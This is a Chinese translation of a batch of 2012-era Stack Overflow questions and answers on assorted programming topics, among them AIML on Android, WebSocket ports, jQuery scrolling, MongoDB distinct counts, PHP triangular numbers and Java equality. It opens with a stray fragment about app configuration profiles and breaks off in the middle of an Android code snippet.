您的应用配置文件将在设备上持续 3 个月。它不可更改，也无法编辑。一旦设备拥有您的个人资料，它就完成了。您可以从设备或应用程序本身中删除该配置文件。如果它只是您公司将使用的应用程序，我建议您自己创建某种验证。您将获取有效设备的应用程序甚至网络服务中的代码。

# android - Android AIML BOT？

> ID：11782554
> 
> 赞同：1
> 
> 时间：2012-08-02T17:16:16.400
> 
> 标签：android, c++, integration, aiml

我有几个与 Android 操作系统中的 AIML 集成相关的问题。我对 Java 了解不多，但我对 AIML 了解很多。我制作了 AIML 文件，现在我想做的是制作一个可以加载文件并在 GUI 中运行它们的应用程序。请告诉我一种方法来做到这一点。如果 AIML 是不可能的，有没有 C++ 方法来做到这一点？请尽快回复。我知道 C++、C 和 AIML。没有太多的 JAVA 或其他编程语言。我对托管基于 Web 的应用程序不感兴趣，因为我没有站点并且无法获得站点。

仅供参考-AIML 代表“人工智能标记语言”。

纳塔拉贾迪提扬。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-14T11:33:02.480

聊天机器人使用复杂的算法。简单地说，chatterbot 可执行文件使用下划线通配符搜索类别。接下来，搜索没有通配符的类别。最后，检查星形通配符。当模式与输入匹配时，AIML 解释器会处理模板标签中的代码。您可能想查看此聊天机器人的源代码，以了解它们的工作原理。

[http://sourceforge.net/projects/qaiml/](http://sourceforge.net/projects/qaiml/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-11-22T12:40:05.183

试试program-ab。

它是用java编写的，很容易集成到android应用程序中。

我不知道是否有任何 c/c++ 聊天机器人。如果可用，那么您可以尝试使用 Android Native 开发工具包（称为 NDK）集成它们。

NDK 用于在 C++ 中编写 android 应用程序。我个人无法在 NDK 方面为您提供帮助。

但是我已经使用 java 将 program-ab 集成到 android 应用程序中。它很简单。

# iis - WebSocket 托管不在端口 80 防火墙问题

> ID：11782556
> 
> 赞同：3
> 
> 时间：2012-08-02T17:16:32.773
> 
> 标签：iis, iis-7, websocket

不在端口 80 中托管的 websocket 服务器将从 Internet 浏览器中不可见？

我不能使用端口 80（IIS 正在使用它），443 和 8080 都不能。

托管在自定义端口上的 websocket 是否会出现防火墙问题？

唯一的办法是使用IIS8作为共享同一个端口（80）？（我正在使用带有 SuperWebSocket 库的 IIS7）

从浏览器访问的 Websocket 不应该部署在自定义端口中吗？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-15T05:08:04.210

根据[这里](https://developer.mozilla.org/en-US/docs/WebSockets/Writing_WebSocket_servers)：

> 警告：服务器可以侦听它选择的任何端口，但如果它选择 80 或 443 以外的任何端口，它可能会遇到防火墙和/或代理问题。端口 443 上的连接往往会更频繁地成功，但当然，这需要安全连接 (TLS/SSL)。另外，请注意大多数浏览器（尤其是 Firefox 8+）不允许从安全页面连接到不安全的 WebSocket 服务器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:26:34.900

为了解决您问题的核心，我非常成功地意识到我的 Web 服务器和 Web Socket 服务器都可以在端口 80 上，但是不同的主机（ origins ）。只要 Web Socket 服务器可以处理来自您的网页源的 CORS 请求，这似乎是一种避免防火墙问题并导致来自 Web 服务器的静态内容和来自 WebSocket 服务器的动态内容的架构。

所以故事是：

*   从 web.server.com:80 提供页面（这是原点）

*   在该网页上的应用程序空间中打开一个 WebSocket 到 websocket.server.com:80/serviceName

    （发出需要被 websocket.server.com 允许的跨域请求，这可能会将 web.server.com 列入白名单）

*   愉快地分别提供动态内容和静态内容。

对您的一些问题的一些更具体的答案：

> > 不在端口 80 中托管的 WebSocket 服务器将从 Internet 浏览器中不可见？

否。如果需要，您在浏览器中的应用程序可以打开一个 WebSocket 到其他端口，但受 CORS 约束。通常将 WebSocket 保留在端口 80 上是有利的，这样中介和边缘网关就不必更改防火墙规则。

> > 我不能使用端口 80（IIS 正在使用它），既不是 443 也不是 8080。托管在自定义端口上的 WebSocket 是否会出现防火墙问题？

最有可能的是，除非您可以控制防火墙并且可以打开其他端口。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T17:31:50.530

如果您可以控制防火墙，那么在自定义端口上运行 websocket 服务器就没有问题。您只需要打开端口以允许传入流量到该端口。

问题不是真正的防火墙本身，而是在流量到达您的服务器之前发生的其他类型的过滤、代理、负载平衡等。但是，除非您有未提及的特定要求，否则简单地允许该端口上的流量应该没有问题。

如果您的 WebSocket 服务器配置为将连接限制到特定来源 (CORS)，那么您将需要允许来源建立连接。源是 Web 服务器的地址，它将为发出 WebSocket 请求的网页提供服务。默认值通常要么完全开放，要么仅限于 websocket 服务器本身的地址。

# jquery - jQuery-带有按钮的垂直div滚动不会连续滚动

> ID：11782558
> 
> 赞同：0
> 
> 时间：2012-08-02T17:16:44.413
> 
> 标签：jquery, html, scroll, bind, smooth

所以我有一个看起来像的 div，`<div id="scroller">...</div>`在这个 div 里面是一堆内容，溢出设置为隐藏。

我试图制作一个平滑滚动的垂直 div。我在 div 顶部有`id='up'`一个按钮，在底部有一个按钮`id='down'`。

现在，当我单击向上或向下按钮时，div 会滚动，但只有大约 1 或 2 行（每次单击）。

有人可以向我解释一下我将如何绑定此功能，以便在按下鼠标时不断滚动？此外，感觉更像是向上/向下单击而不是平滑滚动。

我应该使用不同的函数而不是 scrollTop() 吗？

这是一个[小提琴](http://jsfiddle.net/TPKDG/1/)

对此的任何帮助都会很棒！提前致谢。

```
$(document).ready(function() {
    var timeoutId = 0;

function scrollIt(amount){
    $('#scroller').scrollTop($('#scroller').scrollTop()+amount);
}

$('#down').mousedown(function() {
    timeoutId = setTimeout(scrollIt(5), 1000);
}).bind('mouseleave', function() {
    clearTimeout(timeoutId);
});

$('#up').mousedown(function() {
    timeoutId = setTimeout(scrollIt(-5), 1000);
}).bind('mouseleave', function() {
    clearTimeout(timeoutId);
});
}); 
```

**工作解决方案**

```
$(document).ready(function() {
    var timeoutId = 0;

    function scrollIt(amount){
$('#scroller').scrollTop($('#scroller').scrollTop()+amount);
}

$('#down').mousedown(function() {
    timeoutId = setInterval(function(){scrollIt(5)}, 20);
}).bind('mouseup mouseleave', function() {
    clearInterval(timeoutId);
});

$('#up').mousedown(function() {
    timeoutId = setInterval(function(){scrollIt(-5)}, 20);
}).bind('mouseup mouseleave', function() {
    clearInterval(timeoutId);
});
}); 
```

HTML

```
<div class="scrollup" id="up">&nbsp;</div> 

 <div id="scroller" class="scroller buttongroup">  
    blah blah
    content blah
    blah blah
    content blah
</div>

<div class="scrolldown" id="down">&nbsp;</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:46:44.513

你有两个问题：

1.  onmousedown 事件只会触发一次，不会重复触发，因此一次调用`setTimeout`只会发生一次。解决方案是使用`setInterval`（和`clearInterval`分别）重复调用该方法，直到清除间隔

2.  `setTimeout`/的第一个参数`setInterval`必须是函数。您实际上是在传递 is 的返回`scrollIt(5)`值`undefined`。您必须传递实际函数本身，即`scrollIt`. 这当然会给您带来无法告诉它是加 5 还是减 5 的问题。您可以通过简单地将调用包装在匿名函数中并传递它来解决这个问题：

    ```
    setInterval(function(){ scrollIt(5) }, 1000) 
    ```

此外，对于滚动等操作来说，1000 毫秒是一个*非常*慢的间隔。你需要把它降低到大约 250。这是一个更新的[小提琴](http://jsfiddle.net/8sWjU/1/)，所有这些变化都生效了。

# objective-c - 关闭窗口时从 NSMutableArray 中删除 NSWindowController

> ID：11782560
> 
> 赞同：2
> 
> 时间：2012-08-02T17:16:57.473
> 
> 标签：objective-c, cocoa, memory-management, nsmutablearray, nswindowcontroller

我希望能够在 Cocoa 应用程序中创建多个窗口实例。因此，我创建了一个 NSWindowController 和关联的 XIB。在我的应用程序委托中，我有以下代码：

```
- (IBAction)newWindow:(id)sender
{
    MyWindowController *wc = [[MyWindowController alloc]
            initWithWindowNibName:@"MyWindow"];
    [self.windowControllers addObject:wc];
    [wc showWindow:self];
} 
```

我必须在某处保留一个指向窗口控制器的指针，因为否则 ARC 会释放它。我发现一个常见的解决方案是将其添加到可变数组中。但是，如果窗口稍后关闭，则引用仍将在数组中，因此不会被释放。

关闭窗口时从数组中删除窗口控制器的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:36:19.587

你可以使用`(BOOL)windowShouldClose:(id)sender`-instance方法`NSWindowDelegate`。

我在文档中找不到它，但`(BOOL)windowWillClose:(id)sender`先尝试使用。

见[这里](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/WinPanel/Tasks/UsingWindowNotDel.html#//apple_ref/doc/uid/20000239-BAJBCBBF)。

# php - 我在 Moneybookers 的“商家工具”页面上找不到创建“秘密词”的方法

> ID：11782563
> 
> 赞同：6
> 
> 时间：2012-08-02T17:17:08.543
> 
> 标签：php, payment-gateway

我想在我的网站中集成moneybookers api。

我在 Moneybookers 上创建了一个帐户。

要集成 Moneybookers API，我需要 Merchant tools 下的密语。

但“商家工具”在哪里，“密语”又在哪里？

我附上了两张关于 Moneybookers 成员小组的屏幕截图。

这是在我的帐户中- ![在此处输入图像描述](../Images/6e6d7c1ada45e8eb1766c0c6bfc079b4.png)

但是从教程中 - [http://wyday.com/blog/2011/automate-moneybookers-skrill-using-status_url-ipn-php-asp-net/](http://wyday.com/blog/2011/automate-moneybookers-skrill-using-status_url-ipn-php-asp-net/) 创建“秘密词”的屏幕截图是- ![在此处输入图像描述](../Images/13796a4a040f0dad5272a99ed4f2c989.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-16T12:55:14.863

您实际上需要联系`merchantservices@moneybookers.com`并询问您找不到的东西。这也是他们在手册中所写的内容。

> ...请联系您的客户经理或 Merchantservices@moneybookers.com。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-01-03T15:13:15.800

[Moneybookers](http://www.moneybooker.com/)网站现在被称为[Skrill](https://www.skrill.com/en/)（请记住，以下一些信息可能会造成混淆）

> Skrill（前身为 Moneybookers）[...]

*取自[这篇维基百科文章](https://en.wikipedia.org/wiki/Skrill)。*

* * *

总之，您想访问 Moneybookers/Skrill 的**商家工具**。为此，您需要将您的 Skrill 账户更新为企业账户（通常称为[*“Moneybookers 商家账户”*](https://www.paymentwall.com/en/documentation/Instructions-for-Moneybookers/1257)），否则您**无法****a.)**访问“商家工具”选项卡和**b.)**因此设置秘密词（将在“商家工具”选项卡上提供。

[![商家工具概述](../Images/a27ea230353eedf470b172a4a2aac604.png)](https://i.stack.imgur.com/AUvIT.png) *截取自此[来源的屏幕截图](https://www.conftool.net/en/configuration_documentation/skrill_moneybookers_configuration.html)*

* * *

要创建 Moneybookers 商家帐户，请查看以下两个链接以供**进一步阅读**：

*   查看[ConfTool 的本教程](https://www.conftool.net/en/configuration_documentation/skrill_moneybookers_configuration.html)；**只有第 1 步和第 2**步很重要，因为第 3 步专门针对 ConfTool Pro，因此与您无关。
*   类似于上一个教程，只需[查看 Moneybookers 相关部分](https://www.paymentwall.com/en/documentation/Instructions-for-Moneybookers/1257)。

*如果您对该过程有任何问题，我强烈建议您寻找与 Skrill 相关的教程，因为“Moneybookers”会返回旧的（通常是过时的材料）。*

# mongodb - MongoDB select count(distinct x) on an indexed column - 计算大型数据集的唯一结果

> ID：11782566
> 
> 赞同：84
> 
> 时间：2012-08-02T17:17:22.673
> 
> 标签：mongodb

我已经浏览了几篇文章和示例，但尚未找到在 MongoDB 中执行此 SQL 查询的有效方法（其中有数百万~~行~~文件）

**第一次尝试**

（例如，来自这个几乎重复的问题 - [Mongo 相当于 SQL 的 SELECT DISTINCT？](https://stackoverflow.com/questions/5236160/mongo-equivalent-of-sqls-select-distinct)）

```
db.myCollection.distinct("myIndexedNonUniqueField").length 
```

显然我得到了这个错误，因为我的数据集很大

```
Thu Aug 02 12:55:24 uncaught exception: distinct failed: {
        "errmsg" : "exception: distinct too big, 16mb cap",
        "code" : 10044,
        "ok" : 0
} 
```

**第二次尝试**

我决定尝试做一个小组

```
db.myCollection.group({key: {myIndexedNonUniqueField: 1},
                initial: {count: 0}, 
                 reduce: function (obj, prev) { prev.count++;} } ); 
```

但我收到了这个错误消息：

```
exception: group() can't handle more than 20000 unique keys 
```

**第三次尝试**

我还没有尝试过，但有几个建议涉及`mapReduce`

例如

*   这个[如何在 mongodb 中进行区分和分组？](https://stackoverflow.com/questions/6222811/how-to-do-distinct-and-group-in-mongodb)（不接受，回答作者/OP未测试）
*   这个[按功能划分的 MongoDB 组](https://stackoverflow.com/questions/8769323/mongodb-group-by-functionalities)（似乎类似于第二次尝试）
*   这个[http://blog.emmettshear.com/post/2010/02/12/Counting-Uni​​ques-With-MongoDB](http://blog.emmettshear.com/post/2010/02/12/Counting-Uniques-With-MongoDB)
*   这个[https://groups.google.com/forum/?fromgroups#!topic/mongodb-user/trDn3jJjqtE](https://groups.google.com/forum/?fromgroups#!topic/mongodb-user/trDn3jJjqtE)
*   这个[http://cookbook.mongodb.org/patterns/unique_items_map_reduce/](http://cookbook.mongodb.org/patterns/unique_items_map_reduce/)

**还**

似乎 GitHub 上有一个拉取请求修复了该`.distinct`方法，提到它应该只返回一个计数，但它仍然是开放的：[https ://github.com/mongodb/mongo/pull/34](https://github.com/mongodb/mongo/pull/34)

但在这一点上，我认为值得在这里问一下，关于这个主题的最新消息是什么？我应该转移到 SQL 还是其他 NoSQL DB 来进行不同的计数？还是有有效的方法？

**更新：**

对 MongoDB 官方文档的评论并不令人鼓舞，这是准确的吗？

[http://www.mongodb.org/display/DOCS/Aggregation#comment-430445808](http://www.mongodb.org/display/DOCS/Aggregation#comment-430445808)

**更新2：**

似乎新的聚合框架回答了上述评论...（MongoDB 2.1/2.2 及更高版本，提供开发预览，不适用于生产）

[http://docs.mongodb.org/manual/applications/aggregation/](http://docs.mongodb.org/manual/applications/aggregation/)

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2012-08-02T22:39:32.033

1) 最简单的方法是通过聚合框架。这需要两个“$group”命令：第一个按不同的值分组，第二个计算所有不同的值

```
pipeline = [ 
    { $group: { _id: "$myIndexedNonUniqueField"}  },
    { $group: { _id: 1, count: { $sum: 1 } } }
];

//
// Run the aggregation command
//
R = db.runCommand( 
    {
    "aggregate": "myCollection" , 
    "pipeline": pipeline
    }
);
printjson(R); 
```

2）如果你想用 Map/Reduce 做到这一点，你可以。这也是一个两阶段的过程：在第一阶段，我们构建一个新集合，其中包含键的每个不同值的列表。在第二个中，我们对新集合执行 count()。

```
var SOURCE = db.myCollection;
var DEST = db.distinct
DEST.drop();

map = function() {
  emit( this.myIndexedNonUniqueField , {count: 1});
}

reduce = function(key, values) {
  var count = 0;

  values.forEach(function(v) {
    count += v['count'];        // count each distinct value for lagniappe
  });

  return {count: count};
};

//
// run map/reduce
//
res = SOURCE.mapReduce( map, reduce, 
    { out: 'distinct', 
     verbose: true
    }
    );

print( "distinct count= " + res.counts.output );
print( "distinct count=", DEST.count() ); 
```

请注意，您不能返回内联 map/reduce 的结果，因为这可能会超出 16MB 文档大小的限制。您*可以*将计算保存在一个集合中，然后 count() 计算集合的大小，也可以从 mapReduce() 的返回值中获取结果的数量。

* * *

## 回答 #2

> 赞同：37
> 
> 时间：2013-03-04T21:32:13.427

```
db.myCollection.aggregate( 
   {$group : {_id : "$myIndexedNonUniqueField"} }, 
   {$group: {_id:1, count: {$sum : 1 }}}); 
```

**直接结果：**

```
db.myCollection.aggregate( 
   {$group : {_id : "$myIndexedNonUniqueField"} }, 
   {$group: {_id:1, count: {$sum : 1 }}})
   .result[0].count; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-05-25T06:06:20.113

以下解决方案对我有用

> db.test.distinct('user'); [“亚历克斯”、“英格兰”、“法国”、“澳大利亚”]
> 
> db.countries.distinct('country').length 4

# entity-framework - Odata orderby xy

> ID：11782567
> 
> 赞同：0
> 
> 时间：2012-08-02T17:17:29.233
> 
> 标签：entity-framework, wcf-data-services, odata

我很确定这对于 Odata 是不可能的，但是，在我开始编写服务操作之前，我想问问是否有人对如何实现这一点有任何想法。

基本上，我想在 odata qry 的末尾添加一个 $orderby，有点像这样：

$orderby=SomeIntField-SomeOtherIntField

在 SQL 中很容易做到，不确定如何使用 OData 和 WCF 数据服务做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T20:16:48.380

编辑 - 虽然我最初认为你不能这样做，但事实证明你可以。有关语法示例，请参阅 MS-ODATA 规范的第[2.2.3.6.1.1 节通用表达式语法](http://msdn.microsoft.com/en-us/library/dd541448%28PROT.10%29.aspx)。你会需要`$orderby=SomeIntField sub SomeOtherIntField`.

# php - 如果，如果语句返回 false，则建议从数组中最接近匹配的“正确”数字

> ID：11782572
> 
> 赞同：1
> 
> 时间：2012-08-02T17:17:58.000
> 
> 标签：php

为了简化这个问题，我正在寻找 php 来建议从数组到返回 false 的数字中最接近的三角形数。

例如，如果原始数字的值是 54（不是三角形），我希望 php 从适合此的数组中选择最接近的两个变量：55 是，45 也是。然后将它们作为建议回显。我怎样才能做到这一点？

为了提供一些背景信息，这是我当前的代码：

```
<?php 
$x = 54;
$area = $x * 8;
$ans1 = sqrt(1 + $area) -1;
$ans2 = sqrt(1 + $area) +1;

$answer1 = $ans1 / 2;
$answer2 = -$ans2 / 2;
$answer3 = $answer1 + $answer2;

    if ( is_numeric( $answer2 ) && strpos( $answer2, '.' ) === false ){
        echo "$x is Triangular <br /> <br />";
            if ($answer2 > $answer1) {echo "Total number of glasses per side: ".$answer2."<br />";}
            if ($answer2 < $answer1) {echo "Total number of glasses per side: ".$answer1."<br />";}
            }
    else {
        echo "$x is not Triangular <br /> <br />";} 
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:28:54.150

一种天真的方法是计算数组中每个数字的差异，然后选择差异最小的索引。

更好的方法是使用三角数序列的公式 ((n²+n)/2 = t)。求解n，你得到：

```
n = 0.5 (±sqrt(8t+1)-1) 
```

然后，您可以计算 n，将其四舍五入（向上或向下），并将其放入序列的公式中。瞧，你有最接近的三角形数。

例如

```
$input = 54;
$n = round(0.5*(sqrt(8*$input+1)-1));
$t = $n*($n+1)/2;

echo $t; // 55 
```

分别选择两个周围的值`floor`和`ceil`：

```
$input = 54;
$n1 = floor(0.5*(sqrt(8*$input+1)-1));
$n2 = ceil(0.5*(sqrt(8*$input+1)-1));
echo $n1*($n1+1)/2; // 45
echo $n2*($n2+1)/2; // 55 
```

# c# - 获取选定的 Datagridview（行）到数据库

> ID：11782577
> 
> 赞同：0
> 
> 时间：2012-08-02T17:18:11.857
> 
> 标签：c#, winforms

我正在处理一个新项目，但我不知道我在哪里搞砸了。我希望有几双新的眼睛能够帮助我并引导我朝着正确的方向前进。

我的 Windows 窗体有一个 datagridview 和一个按钮，该按钮用于保存用户选择的选定行并将它们保存到数据库中。我现在不关心储蓄我想知道我在哪里做错了`dataGridView.Selected.Rows`？我已将 datagridview 的 SelectionMode 属性更改为“全行选择”。当它到达 foreach 循环时，选定的行被分解并保存到指定的对象，然后整个对象被保存到表/数据库中。当它开始保存它时，它似乎有来自datagridview的所有行，而不仅仅是用户选择的......

提前致谢

```
 foreach (DataGridViewRow dr in dataGridView1.SelectedRows)
        {

            int i = 0;
            i = dataGridView1.SelectedRows[0].Index;

            log slog = new log();

            slog.Date = dataGridView1[0, i].Value.ToString();
            slog.Level = dataGridView1[1, i].Value.ToString();
            slog.Project = dataGridView1[2, i].Value.ToString();
            slog.Number = dataGridView1[3, i].Value.ToString();
            slog.Method = dataGridView1[4, i].Value.ToString();
            slog.Property = dataGridView1[5, i].Value.ToString();

            logEntity.logs.AddObject(slog);

        }
   logEntity.SaveChanges();
} 
```

-

```
//other code tried
//for (int i = 0; i <= dataGridView1.SelectedRows.Count - 1; i++)
//var rowIndexes = dataGridView1.SelectedCells.Cast<DataGridViewCell>()
//          .Select(cell => cell.RowIndex)
//          .Distinct();
//dataGridView1.SelectedRows.Select(r => r.Index); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T18:28:02.107

我认为您的问题在于索引。`i`如果你已经有了你想要的行，我会摆脱它。

```
foreach (DataGridViewRow dr in dataGridView1.SelectedRows)
        {
         log slog = new log();

         slog.Date = dr.cells(0).Value.ToString();
         slog.Level = dr.cells(1).Value.ToString();
         slog.Project = dr.cells(2).Value.ToString();
         slog.Number = dr.cells(3).Value.ToString();
         slog.Method = dr.cells(4).Value.ToString();
         slog.Property = dr.cells(5).Value.ToString();

         logEntity.logs.AddObject(slog);

        }
logEntity.SaveChanges(); 
```

# java - 是否可以在条件内声明变量？

> ID：11782578
> 
> 赞同：6
> 
> 时间：2012-08-02T17:18:13.913
> 
> 标签：java

这就是我将如何做一个while循环：

```
boolean more = true;
while (more)
{
  // do something
  if (someTest()) 
  {
    more = false;
  }
} 
```

这很标准。我很想知道是否有一种方法可以在 Java 中执行类似于以下代码的操作：（我想我已经在 C 中看到过类似的东西）

```
// The code below doesn't compile (obviously)
while (boolean more = true)
{
  // do something
  if (someTest())
  {
    more = false;
  }
} 
```

我只问这个是因为目前我不喜欢在循环范围*之外*定义条件中使用的变量（在本例中为“更多”）的方式，即使它只在循环*内部*相关。循环结束后，它没有任何意义。

* * *

*** * 更新 * ***

参观 Porcaline 密室后，我想到了一个主意：

```
for (boolean more=true; more; more=someTest())
{
  // do something
} 
```

它并不完美；它滥用了 for 循环，我想不出*至少执行一次*循环的方法，但它很接近......有没有办法确保循环执行 1 次以上？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-02T17:36:12.337

要从字面上回答您的问题，您可以这样做

```
for(boolean more = true; more; ) {
   more = !someTest();
} 
```

但这与

```
while(!someTest()); 
```

如果它必须至少执行一次你可以做

```
do {

} while(!someTest()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:32:38.733

对于您的具体情况，您可以将代码简化为：

```
while (true) {
  if (someTest()) {
    break;
  }
} 
```

通常，您可以将外部范围声明替换为内部范围声明，但您需要移动循环条件：

```
while (true) {
  boolean more=true;
  ...
  if (someTest()) {
    more = false;
  }
  ...
  if (!more) {
    break;
  }
} 
```

甚至：

```
do {
  boolean more=true;
  ...
  if (someTest()) {
    more = false;
  }
  ...
  if (!more) {
    break;
  }
} while (true); 
```

我认为在循环之外定义你的条件更清楚。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:36:04.207

KidTempo, in the example you gave, I think that more would be re-initialized each time through the loop. Each time through the loop, the conditional is re-evaluated, so assuming that you are able to define a variable in a conditional, the variable would be re-initialized each time that conditional is re-evaluated. This would also apply to other types of conditionals, so I would say to avoid defining variables in a conditional.

# javascript - Javascript 对象字符串值 - 应隐藏时呈现的 HTML 代码

> ID：11782581
> 
> 赞同：0
> 
> 时间：2012-08-02T17:18:26.940
> 
> 标签：javascript, css, object

我有一个 js 对象（它实际上是另一个对象中的一个对象）：

```
item2 : {               
    itemTitle : "This is item 2",
    itemContent : "To me, in France, a friend speaks from America.  The energy that brings me his voice is born of dammed-up waters a thousand miles from where he sits. <p> The energy I burn up in listening to him is dispensed in the same instant by a lake formed in the River Yser..."
}, 
```

这两个项目 (`itemTitle`和`itemContent`) 显示在`p`div 中的相应元素中，它们构成了手风琴显示（显示标题，在单击标题之前隐藏内容）。

它工作正常，除非我在其中添加带有 html 标签的内容，在本例中是一个`p`标签。第一段是隐藏的，第二段是显示的，但是由于两个段落都包含在一个`p`元素中，该元素`display`设置为`none`我认为两者都应该隐藏。

所以我认为浏览器（最新的 Firefox）正在查看`p`元素并呈现第二段。我想也许如果我关闭第二个`p`可以处理它的元素。但没有骰子。

过去两年我一直在做 Objective-c 的东西，所以我的 css/js/html foo 有点不对劲。如果它位于隐藏的元素中，为什么浏览器会显示它？

这是我生成html的方式：

```
//loop through the accordian properties and build out the html code for them
var i = 0;
for (thisItem in accordian.accordianItems) {
    i++;
    var thisItemData = accordian.accordianItems[thisItem];
    var thisItemCode = "<div id=\"itemContainer\" itemID=\"item_" + i.toString() + "\">" + "<div id=\"itemTitle\"><p class=\"title\"><a href=\"javascript:void(0);\" class=\"titleBar\" itemID=\"item_" + i.toString() + "_titlebar\">" + thisItemData.itemTitle + "</a></p></div>" + "<div id=\"itemContent\"><p class=\"content\">" + thisItemData.itemContent + "</p></div>" + "</div>";
    accordianCode += thisItemCode;
}
//push the code out to our container div
$("#accordianContainer").html(accordianCode); 
```

我的CSS：

```
#itemContainer {
    margin: 0 0 5px 0;
}
.title {
    margin: 0 0 2px 0;
    height: 20px;
    vertical-align: middle;
    background-color: #39F;
    color: #fff;
    font-family: Arial, Geneva, sans-serif;
    font-size: 14px;
    font-weight: 900;
}
.title a {
    color: #fff;
    text-decoration: none;
}
.content {
    margin: 0 0 0 5px;
    color: #333;
    font-family: "Times New Roman", Times, serif;
    font-size: 12px;
    font-weight: 200;
    display: none;
} 
```

任何帮助，将不胜感激。

是的，我在整个代码中都拼错了手风琴，我在那里修复了它，但不是在这里。：P

编辑：将 p 标签切换为 br，问题就消失了。所以我的新猜测是 ap 是一个块项目？我想我可以设置 br 标签的样式，但我更喜欢 p，有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:38:12.940

a 中只允许内联元素`p`。请参阅[http://www.w3.org/TR/html401/struct/text.html#h-9.3.1](http://www.w3.org/TR/html401/struct/text.html#h-9.3.1)。浏览器选择将其呈现为自己的元素，从而将其从隐藏的`p`.

# ruby-on-rails-3 - 如何使 ActsAsTaggableOn::Tag 从 Tag 模型继承方法

> ID：11782582
> 
> 赞同：0
> 
> 时间：2012-08-02T17:18:29.873
> 
> 标签：ruby-on-rails-3, acts-as-taggable-on

我在 Rails 3.0.9 应用程序中使用acts-as-taggable-on 2.0.6 进行标记。我已经成功地将 db-backed 属性添加到 Tag 模型中，例如每个标签都有一个 RSS 提要，因此我可以调用`@post.tags.first.feed_url`以从我的数据库中获取 feedburner URL。

但是，虽然我可以向 Tag 模型添加属性，但似乎我无法添加实例方法。我创建了实例方法：

```
class Tag < ActiveRecord::Base
  ...
  def subscribable?
    !feed_url.blank?
  end
  ...
end 
```

但是当我打电话时，`@post.tags.first.subscribable?`我得到了错误：

```
NoMethodError: undefined method `subscribable?' for #<ActsAsTaggableOn::Tag:0x00000100d32290> 
```

有没有办法告诉`ActsAsTaggableOn::Tag`对象从`Tag`模型继承模型方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-26T16:32:32.543

你需要添加这个`/config/initializers/tag_monkey_patch.rb`

```
class ActsAsTaggableOn::Tag
  def subscribable?
    !feed_url.blank?
  end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T08:54:22.790

我想知道完全相同的事情。据我尝试，它对我不起作用..

```
class Tag < ActsAsTaggableOn::Tag
   def total_count
     ...
   end
end 
```

当我以脏链形式示例调用它时，如下所示：

```
my_model.my_instance.tag_counts_on(:tags).first.total_count 
```

我得到一个

```
undefined method `total_count' for #<ActsAsTaggableOn::Tag id: 1, name: "first"> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:42:15.257

据我了解，您不应该像这样声明一个新的“标签”模型，而应该像这样覆盖类：

```
class ActsAsTaggableOn::Tag
   def total_count
      ...
   end
end 
```

# java - Java等于传递关系

> ID：11782585
> 
> 赞同：-1
> 
> 时间：2012-08-02T17:18:40.137
> 
> 标签：java, equals

我正在尝试根据以下要求实现对象相等：

```
class MyObject {
  String x;
  String y;
} 
```

1) 如果被比较的 2 个对象的两个属性都不为空，那么它们相等 if x.equals(x) && y.equals(y)

2) 如果在任何被比较的对象上至少有一个 x 为空，那么如果 y.equals(y) 则它们相等（假设两个 y 都不为空）

3) 如果在任何被比较的对象上至少有一个 y 为空，那么如果 x.equals(x) 则它们相等（假设两个 x 都是非空的）

经过几次尝试，我开始认为基于这些要求无法实现equals方法的传递关系。欢迎评论！谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T17:24:28.830

取这些 (x,y) 对：

根据规则，(1,2)=(1,null)=(1,3)，这会让你相信(1,2)=(1,3)，这是错误的。所以是的，这是不可能的。

编辑：误读规则，现已修复

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:26:32.637

就这三个要求来说，你是对的；你没有传递性。

举这些例子：

```
x = "hello", y = "mom"
x = "hello", y = null
x = "hello", y = "world" 
```

照你说的，第一和第二相等，第二和第三相等，但第一和第三不相等。

您可能想要添加的限制是 1）如果一个 x 为空，另一个必须相同才能使它们相等，以及 2）对于 ys 相同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:25:33.620

我不太确定“如果至少有一个 y 为空”是什么意思，因此您可能需要进一步澄清这一点，但这里有一个基于我如何理解您的规范的解决方案。

```
public boolean yourEquals(Object x, Object y) {

    if(x != null && y != null) return x.equals(x) && y.equals(y);
    else if(x == null) return y.equals(y);
    else return x.equals(x);

} 
```

如果我做了有缺陷的假设，请更正我的假设，但是您对问题的描述在某些地方有些难以理解。

**编辑：**当然，这种关系不是传递的。如上所述，与您的要求的任何关系*都*不能传递。但这是根据您的三个规则返回布尔值的函数。

# android - 程序似乎忽略了代码行

> ID：11782586
> 
> 赞同：0
> 
> 时间：2012-08-02T17:18:43.570
> 
> 标签：android, logging, arraylist, logcat

我需要有关此功能的帮助。

我知道 if 语句会识别我的输入，因为它会影响其他地方的程序，但我不确定发生了什么，因为即使在 adb logcat 中，这个特定的日志也不会显示任何内容。

该函数来自的同一类文件中的其他日志语句显示得很好，并且值更新似乎正在发生变化（“全部显示”出于某种原因将其空白，但我可以在我让日志工作后弄清楚这一点。 )

我不确定如何搜索这个问题，因为它非常具体，我不知道是什么原因造成的（不过可能是我没有想到的简单问题。）

```
void command(String input)
{

    //do stuff here
